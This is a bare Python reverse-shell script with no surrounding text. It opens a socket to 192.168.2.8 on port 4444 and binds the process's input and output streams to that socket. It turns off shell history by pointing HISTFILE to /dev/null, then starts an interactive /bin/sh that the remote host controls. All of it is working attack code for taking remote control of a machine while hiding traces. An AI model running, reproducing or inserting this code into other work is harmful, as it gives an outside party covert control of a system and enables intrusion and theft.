import socket, subprocess, os, pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.2.8", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv("HISTFILE", '/dev/null')
# pty.spawn("/bin/bash")
p = subprocess.call(["/bin/sh", "-i"])
s.close()
